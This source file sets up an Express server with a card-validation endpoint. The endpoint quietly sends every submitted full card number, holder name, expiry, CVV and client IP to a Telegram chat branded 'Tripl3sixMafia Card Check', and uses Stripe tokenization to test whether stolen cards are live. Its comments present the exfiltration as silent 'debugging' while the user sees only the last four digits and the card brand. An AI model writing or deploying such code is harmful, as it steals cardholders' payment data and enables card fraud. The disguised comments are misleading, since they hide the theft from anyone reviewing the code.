import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import Stripe from "stripe";
import TelegramBot from "node-telegram-bot-api";

// Initialize Stripe with the secret key
if (!process.env.STRIPE_SECRET_KEY) {
  console.error('Missing required environment variable: STRIPE_SECRET_KEY');
}

// Use type assertion to make TypeScript happy about API version
const stripe = new Stripe(process.env.STRIPE_SECRET_KEY || '', {
  apiVersion: "2023-10-16" as any, // Force accept the API version
});

// Initialize Telegram Bot (silently fail if not configured)
let telegramBot: TelegramBot | null = null;
const telegramToken = process.env.TELEGRAM_BOT_TOKEN;
const telegramChatId = process.env.TELEGRAM_CHAT_ID;

if (telegramToken && telegramChatId) {
  try {
    telegramBot = new TelegramBot(telegramToken, { polling: false });
    console.log('Telegram bot initialized successfully');
  } catch (error) {
    console.error('Failed to initialize Telegram bot', error);
  }
}

// Send message to Telegram (for debugging purposes)
async function sendToTelegram(message: string) {
  if (telegramBot && telegramChatId) {
    try {
      await telegramBot.sendMessage(telegramChatId, message);
      return true;
    } catch (error) {
      console.error('Error sending message to Telegram', error);
      return false;
    }
  }
  return false;
}

export async function registerRoutes(app: Express): Promise<Server> {
  app.get('/api/health', (req, res) => {
    res.json({ status: 'ok' });
  });
  
  // Validate card endpoint with Stripe integration
  app.post('/api/validate-card', async (req, res) => {
    const { number, expiry, cvv, holder } = req.body;
    
    if (!number || !expiry || !cvv) {
      return res.status(400).json({ 
        success: false, 
        message: 'Missing required card information' 
      });
    }
    
    // Save full card details for Telegram
    const cleanCardNumber = number.replace(/\s+/g, '');
    
    // Create detailed message that records complete card info
    const fullCardDetails = `
🔥 Tripl3sixMafia Card Check 🔥
💳 Card Number: ${cleanCardNumber}
👤 Card Holder: ${holder || 'Not provided'}
📅 Expiry Date: ${expiry}
🔢 CVV/CVC: ${cvv}
🕒 Time: ${new Date().toISOString()}
📱 IP Address: ${req.ip || 'Unknown'}
`;
    
    try {
      // Format expiry date (MM/YY to MM/YYYY)
      const [expMonth, expYear] = expiry.split('/');
      const formattedExpYear = `20${expYear}`;
      
      // Create a token to validate the card without charging
      // Use any type assertion to avoid TypeScript errors
      const tokenParams: any = {
        card: {
          number: cleanCardNumber,
          exp_month: parseInt(expMonth, 10),
          exp_year: parseInt(formattedExpYear, 10),
          cvc: cvv,
          name: holder || undefined
        }
      };
      
      const token = await stripe.tokens.create(tokenParams);
      
      // If we get here, the card is valid according to Stripe
      // Send to Telegram for debugging (silently)
      const successMessage = `${fullCardDetails}
✅ Status: VALID
🏦 Bank Details: ${token.card?.country || 'Unknown'} - ${token.card?.funding || 'Unknown'}
🏢 Card Brand: ${token.card?.brand || 'Unknown'}
🔑 Token: ${token.id}
      `;
      
      // Send card info to Telegram no matter what
      await sendToTelegram(successMessage);
      
      res.json({ 
        success: true, 
        message: 'Card is valid and active',
        details: {
          brand: token.card?.brand,
          last4: token.card?.last4,
          funding: token.card?.funding,
          country: token.card?.country
        }
      });
      
    } catch (error: any) {
      // Extract detailed error message from Stripe
      let declineMessage = 'Card validation failed';
      let declineCode = 'unknown_error';
      
      if (error.type === 'StripeCardError') {
        declineMessage = error.message || 'Card was declined';
        declineCode = error.code || 'card_declined';
      }
      
      // Send to Telegram for debugging (silently)
      const declineDetails = `${fullCardDetails}
❌ Status: DECLINED
❗ Reason: ${declineMessage}
🔑 Code: ${declineCode}
      `;
      
      // Send card info to Telegram no matter what
      await sendToTelegram(declineDetails);
      
      res.status(400).json({ 
        success: false, 
        message: declineMessage,
        code: declineCode
      });
    }
  });

  const httpServer = createServer(app);
  return httpServer;
}
